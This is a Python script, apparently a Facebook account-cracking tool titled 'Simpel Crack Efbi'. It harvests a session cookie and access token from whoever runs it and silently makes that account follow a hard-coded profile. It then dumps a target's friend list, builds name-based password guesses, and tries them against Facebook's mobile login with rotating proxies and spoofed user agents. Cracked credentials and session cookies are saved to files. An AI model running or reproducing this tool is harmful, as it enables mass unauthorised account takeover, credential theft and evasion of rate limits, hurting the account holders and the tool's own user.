import requests, re, json, sys, os, random, datetime, time, platform, bs4, subprocess
from concurrent.futures import ThreadPoolExecutor as Dosa_Lu_Yang_Tanggung_Okeh_Sepuh

toke, id, uid, loop, ok, cp, rc, rr, rg, ses, parser, M, K, H, X = [], [], [], 0, 0, 0, random.choice, random.randint, random.randrange, requests.Session(), bs4.BeautifulSoup,'\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;97m'
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'5Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'};tg = datetime.datetime.now().day;bl = rb[(str(datetime.datetime.now().month))];th = datetime.datetime.now().year;okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt';cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt';sys.stdout.write('\x1b]2; Simpel Crack Efbi by Niaw.MXV \x07')

try: proksi = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text; open('proxy.txt','w').write(proksi)
except Exception as e: print('{M}koneksi error, cek jaringan internetmu !')
proxy = open('proxy.txt','r').read().splitlines()

def fast_write(anim):
	for gas in anim + "\n": sys.stdout.write(gas); sys.stdout.flush(); time.sleep(0.01)

def slow_write(anim):
	for gas in anim + "\n": sys.stdout.write(gas); sys.stdout.flush(); time.sleep(0.05)

def DestinyLine():
	fast_write(f'{X}────────────────────────────') # fast_write(f'{X}─' *28)
	
def Logo_Terlacknat():
	os.system('clear' if 'linux' in sys.platform.lower() else 'cls'); fast_write(f'''{M} _____ ____ _____ ____ _  _ \n{M}|  |  |  __|  |  |  __| \/ |\n{X}|     |  __|     |  __|>  < \n|_|_|_|____|_|_|_|____|_/\_|\n{X}────────────────────────────\n{M}■ {X}simpel crack brute force {M}■{X}\n{X}────────────────────────────''')
	
def Cek_Cookies_Dulu():
	try:
		token = open('.token.txt','r').read(); cok = open('.cok.txt','r').read(); toke.append(token)
		try:
			data_efbi = requests.get('https://graph.facebook.com/me?fields=id&access_token='+toke[0], cookies={'cookie':cok}); uids_fb = json.loads(data_efbi.text)['id']; Gasken_Clek()
		except KeyError:
			slow_write(f'{M}■ cookie anda invalid'); time.sleep(2); Login_Dulu()
		except requests.exceptions.ConnectionError:
			slow_write(f'{M}koneksimu bermasalah ster :('); exit()
	except IOError:
		Login_Dulu()

def Hayang_Difollow():
	try: cok = open('.cok.txt','r').read()
	except IOError: slow_write(f'{M}■ cookie anda invalid'); time.sleep(2); exit()
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/100083788721465',cookies={'cookie':cok}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'): x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cok}).text; exit()
	except(Exception)as e:print(e)#< Response error

def Login_Dulu():
	Logo_Terlacknat(); slow_write(f'{M}■ {X}masukan cookies facebook {M}■'); DestinyLine(); cok = input(f'{M}■ {X}'); open(".cok.txt", "w").write(cok)
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}; link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok}); find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find)==0: slow_write(f'{M}■ {M}cookie anda invalid'); time.sleep(2); exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok}); took = re.search('(EAAB\w+)',xz.text).group(1); open(".token.txt", "w").write(took); DestinyLine(); slow_write(f'{M}■ {X}token eaab facebook anda {M}■'); DestinyLine(); fast_write(f'{M}■ {X}{took}'); DestinyLine(); slow_write(f'{M}■ {X}cookies facebook actived {M}■'); DestinyLine(); Hayang_Difollow(); exit()
	except Exception as e:exit(e)

def Gasken_Clek():
	try: token = open('.token.txt','r').read(); cok = open('.cok.txt','r').read()
	except IOError: slow_write(f'{M}■ {M}cookie anda invalid'); Login_Dulu()
	Logo_Terlacknat(); idt = input(f'{X}■ {X}input id : '); Dump_Friendlist(idt,"",{"cookie":cok},token); Urutin_id()

def Dump_Friendlist(idt,fields,cookie,token):
	try:
		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
		if len(id)==0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}", params=params, headers=headers, cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"]); sys.stdout.write(f"\r{X}■{X} total id : {len(id)} terkoleksi"), sys.stdout.flush()
		Dump_Friendlist(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except: pass

def Urutin_id():
	if len(id)==0: slow_write(f'{X}└──> id privat/ttl pocil'); exit()
	for crack_uid_baru_dulu in id: uid.insert(0, crack_uid_baru_dulu)
	print('\r'); DestinyLine(); slow_write(f'{M}■ {X}on off modpes per 300 id {M}■'); DestinyLine(); Word_List()
	
def Word_List():
	with Dosa_Lu_Yang_Tanggung_Okeh_Sepuh(max_workers=30) as Gasken_Krek:
		for user_id in uid:
			idf, nmf = user_id.split('|')[0] ,user_id.split('|')[1].lower()
			depan = nmf.split(" ")[0]
			pwv = ['kamu nanya','kamunanya','kata sandi']
			if len(nmf)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass
				else:
					pwv.append(nmf); pwv.append(depan+depan); pwv.append(depan+" "+depan); pwv.append(depan+"123"); pwv.append(depan+"1234"); pwv.append(depan+"12345"); pwv.append(depan+"123456"); pwv.append(depan+"12"); pwv.append(depan+"00"); pwv.append(depan+"01"); pwv.append(depan+"02"); pwv.append(depan+"03"); pwv.append(depan+"04"); pwv.append(depan+"05"); pwv.append(depan+"06"); pwv.append(depan+"07"); pwv.append(depan+"08"); pwv.append(depan+"09"); pwv.append(depan+"21"); pwv.append(depan+"321"); pwv.append(depan+"234")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nmf.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwv.append(nmf); pwv.append(tengah+tengah); pwv.append(tengah+" "+tengah); pwv.append(tengah+"123"); pwv.append(tengah+"1234"); pwv.append(tengah+"12345"); pwv.append(tengah+"123456")
					except:
						try:
							belakang = nmf.split(' ')[2]
							if len(belakang)<=3:
								pass
							else:
								pwv.append(nmf); pwv.append(belakang+belakang); pwv.append(belakang+" "+belakang); pwv.append(belakang+"123"); pwv.append(belakang+"1234"); pwv.append(belakang+"12345"); pwv.append(belakang+"123456")
						except:
							pwv.append(nmf)
				else:
					pwv.append(nmf); pwv.append(depan+depan); pwv.append(depan+" "+depan); pwv.append(depan+"123"); pwv.append(depan+"1234"); pwv.append(depan+"12345"); pwv.append(depan+"123456"); pwv.append(depan+"12"); pwv.append(depan+"00"); pwv.append(depan+"01"); pwv.append(depan+"02"); pwv.append(depan+"03"); pwv.append(depan+"04"); pwv.append(depan+"05"); pwv.append(depan+"06"); pwv.append(depan+"07"); pwv.append(depan+"08"); pwv.append(depan+"09"); pwv.append(depan+"21"); pwv.append(depan+"321"); pwv.append(depan+"234")
			Gasken_Krek.submit(Hejo_Sugan_Barudak,idf,pwv,nmf)
	print('\r'); DestinyLine(); slow_write(f'{M}■ {X}akun ok: {H}%s{X} | akun cp: {K}%s {M}■'%(ok,cp)); DestinyLine()

def Hejo_Sugan_Barudak(idf,pwv,nmf):
	global loop, ok, cp
	print(f"\r{X}■ {loop}: {H}{ok}{X}: {K}{cp}{X}: {idf}{X} ", flush = True, end = "")
	for pw in pwv:
		try:
			ses, ua, url, bhs = requests.Session(), Ua_Afah_Sajah_lah(), 'mbasic.facebook.com', rc(['id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9,en-US;q=0.8,en;q=0.7', 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7', 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7']); list = rc(proxy); proxyes = {'http': 'socks5://'+list}
			hdup = {
			 'Host': '{}'.format(url),
			 'sec-ch-ua': '"Not A(Brand";v="99", "Android WebView";v="{}", "Chromium";v="{}"' .format(re.search(r'Chrome/(\d+)', str(ua)).group(1), re.search(r'Chrome/(\d+)', str(ua)).group(1)),
			 'sec-ch-ua-mobile': '?1',
			 'sec-ch-ua-platform': '"Android"',
			 'upgrade-insecure-requests': '1',
			 'user-agent': '{}'.format(ua),
			 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			 'dnt': '1',
			 'x-requested-with': 'mark.via.gp',
			 'sec-fetch-site': 'none',
			 'sec-fetch-mode': 'navigate',
			 'sec-fetch-user': '?1',
			 'sec-fetch-dest': 'document',
			 'accept-encoding': 'gzip, deflate',
			 'accept-language': '{}'.format(bhs)
			}
			link = ses.get(
			'https://{}/login.php?next=https://{}/home.php?refsrc=deprecated&hrc=1&_fb_noscript=true&refsrc=deprecated&_rdr'.format(url, url),
			 headers=hdup
			)
			date = {
			 'lsd': re.search('name="lsd" value="(.*?)"', link.text).group(1),
			 'jazoest': re.search('name="jazoest" value="(.*?)"', link.text).group(1),
			 'm_ts': re.search('name="m_ts" value="(.*?)"', link.text).group(1),
			 'li': re.search('name="li" value="(.*?)"', link.text).group(1),
			 'try_number': '0',
			 'unrecognized_tries': '0',
			 'email': '{}'.format(idf),
			 'pass': '{}'.format(pw),
			 'login': 'Masuk',
			 'bi_xrwh': '0'
			}
			head = {
			 'Host': url,
			 'content-length': '{}'.format(len(str(date))),
			 'cache-control': 'max-age=0',
			 'dpr': '{}'.format(str(rr(1, 3))),
			 'viewport-width': '980',
			 'sec-ch-ua': '"Not A(Brand";v="99", "Android WebView";v="{}", "Chromium";v="{}"' .format(re.search(r'Chrome/(\d+)', str(ua)).group(1), re.search(r'Chrome/(\d+)', str(ua)).group(1)),
			 'sec-ch-ua-mobile': '?1',
			 'sec-ch-ua-platform': '"Android"',
			 'sec-ch-ua-platform-version': '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),
			 'sec-ch-ua-model': '""',
			 'sec-ch-ua-full-version-list': '"Not A(Brand";v="99.0.0.0", "Android WebView";v="{}", "Chromium";v="{}"' .format(re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1)),
			 'sec-ch-prefers-color-scheme': 'dark',
			 'upgrade-insecure-requests': '1',
			 'origin': 'https://{}'.format(url),
			 'content-type': 'application/x-www-form-urlencoded',
			 'user-agent': '{}'.format(ua),
			 'cookie': ';'.join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()]),
			 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			 'x-requested-with': 'mark.via.gp',
			 'sec-fetch-site': 'same-origin',
			 'sec-fetch-mode': 'navigate',
			 'sec-fetch-user': '?1',
			 'sec-fetch-dest': 'document',
			 'referer': link.url,
			 'accept-encoding': 'gzip, deflate, br',
			 'accept-language': '{}'.format(bhs)
			}
			sign = ses.post(
			'https://{}/login/device-based/regular/login/?next=https%3A%2F%2F{}%2Fhome.php%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=100&refid=9'.format(url, url),
			 data=date,
			 headers=head,
			 proxies=proxyes,
			 allow_redirects=False
			)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1; coki = ses.cookies.get_dict(); kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "ps_l=0;ps_n=0;" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]); print(f'\r{X}■ {H}{idf} {pw} - {nmf}{X}\n{X}└──> {H}{kuki};{ua}{X}'); open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n'); break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1; print(f'\r{X}■ {K}{idf} {pw} - {nmf}{X}\n{X}└──> {M}{ua}{X}'); open('CP/'+cph,'a').write(idf+'|'+pw+'\n'); break
			else: continue
		except requests.exceptions.ConnectionError: time.sleep(35)
	loop+=1

def Ua_Afah_Sajah_lah():
	dev_a = rc([f'CPH{rr(1700, 1899)}',f'CPH{rr(1800, 2399)}'])
	dev_b = rc([f'V{rr(1920, 2299)}',f'vivo {rr(1000, 2000)}'])
	dev_c = rc([f'RMX{rr(1800, 2399)}',f'RMX{rr(3000, 3399)}'])
	dev_d = rc([f'Infinix X{rr(550, 699)}{rc(["B", "D",""])}'])
	andro = rc([f'{str(rr(5,9))}.0{rc([".0", ""])}', rr(7,14)])
	bhasa = rc(['en-us',  'en-gb', 'id-id', 'ms-my',  'zh-cn'])
	bulid = rc(['O11019','LMY47V','NRD90M','MRA58K', 'LMY47I'])
	dukaa = rc(['LMY47I','RP1A','PPR1','PKQ1', 'SP1A', 'TP1A'])
	teing = rc([f'00{str(rr(1, 9))}',   f'0{str(rr(10, 32))}'])
	build = rc([f'{dukaa}.{str(rg(130000,  230000))}.{teing}'])
	crhom = (f'{rr(99, 123)}.0.{rg(5000, 6299)}.{rr(40, 199)}')
	rkrut = rc([f'{dev_a}', f'{dev_b}',f'{dev_c}', f'{dev_d}'])
	return  rc([f"Mozilla/5.0 (Linux; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc(['',f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' GoogleApp/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f' GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};] FBNV/1',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 {andro}) NABar/1.0',f' baiduboxapp/4.8 (Baidu; P1 {andro})',f' Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}',''])}",
				f"Mozilla/5.0 (Linux; Android {andro}; {rkrut}{rc(['',f' Build/{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{crhom} Mobile Safari/537.36{rc(['',f' EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}',f' OPX/{str(rr(1,2))}.{str(rr(0,9))}',''])}",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc([f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}',f' OPT/{str(rr(1,2))}.{str(rr(0,9))}',f' PHX/{str(rr(4,14))}.{str(rr(0,9))}'])}",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom}{rc([f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36 OPR/{str(rr(10,83))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}"])
# def Ua_Moto_Testing(): browt, browu, browz, browv = rc([f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}']), rc([f" OPR/{str(rr(50,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}",f" HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}beta",f" HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}",f" OPT/{str(rr(1,2))}.{str(rr(0,9))}.{str(rr(0,9))}",f" OPT/1.{str(rr(0,30))}.{str(rr(0,99))}",f" OPT/{str(rr(1,2))}.{str(rr(0,9))}",f" PHX/{str(rr(4,14))}.{str(rr(0,9))}"]), rc(["",f" OPR/{str(rr(20,50))}.{str(rr(0,1))}.{str(rr(1000,4999))}.{str(rr(70000,209999))}",f" OPR/{str(rr(50,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}",f" EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}",f" AlohaBrowser/{str(rr(1,5))}.{str(rr(0,29))}.{str(rr(0,9))}",f" AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}",f" OPX/{str(rr(1,2))}.{str(rr(0,9))}",""]), rc(["",f" OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}",f" {rc(['GoogleApp','GSA'])}/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm{rc(['64',''])}",f"[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]",f" [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]{rc([' FBNV/1',''])}",f" Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}",""]);z = [f'Mozilla/5.0 (Linux; U; Android 12; id-id; moto e22s Build/STCS32.60-51-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 11; id-id; moto g(9) play Build/RPXS31.Q2-58-17-7-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 12; id-id; XT2125-4 Build/S1RN32.55-16-13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile Safari/537.36{browu}','MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',f'Mozilla/5.0 (Linux; U; Android 13; id-id; XT2241-1 Build/T1SQ33.111-12-19) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto e22s Build/STCS32.60-74-3;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 13; id-id; motorola edge 40 neo Build/T3TM33.23-100-7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto g34 5G Build/U1UG34.23-37-1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto g24 Build/UTAS34.82-21-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36{browu}',f'Mozilla/5.0 (Linux; U; Android 12; id-id; moto e22s Build/STCS32.60-51-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 11; id-id; moto g(9) play Build/RPXS31.Q2-58-17-7-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 12; id-id; XT2125-4 Build/S1RN32.55-16-13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 13; id-id; XT2241-1 Build/T1SQ33.111-12-19) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto e22s Build/STCS32.60-74-3;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 13; id-id; motorola edge 40 neo Build/T3TM33.23-100-7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto g34 5G Build/U1UG34.23-37-1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; U; Android 14; id-id; moto g24 Build/UTAS34.82-21-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0{browt} Mobile Safari/537.36',f'Mozilla/5.0 (Linux; Android 12; moto e22s Build/STCS32.60-51-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 12; XT2125-4 Build/S1RN32.55-16-13; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 13; XT2241-1 Build/T1SQ33.111-12-19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 14; moto e22s Build/STCS32.60-74-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.54 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 13; motorola edge 40 neo Build/T3TM33.23-100-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 14; moto g34 5G Build/U1UG34.23-37-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 14; moto g24 Build/UTAS34.82-21-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36{browv}',f'Mozilla/5.0 (Linux; Android 13; motorola razr 40 Build/T2TV33.45-149; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.3 Mobile Safari/537.36{browv}'f'Mozilla/5.0 (Linux; Android 12; moto e22s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 11; moto g(9)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 12; XT2125-4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.54 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 13; XT2241-1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.3 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 14; moto e22s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.54 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 13; motorola edge 40 neo) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.3 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 14; moto g34 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 14; moto g24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 13; motorola razr 40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.3 Mobile Safari/537.36{browz}',f'Mozilla/5.0 (Linux; Android 10; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.5305.81 Mobile Safari/537.36{browz}'];return rc(z)

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Cek_Cookies_Dulu()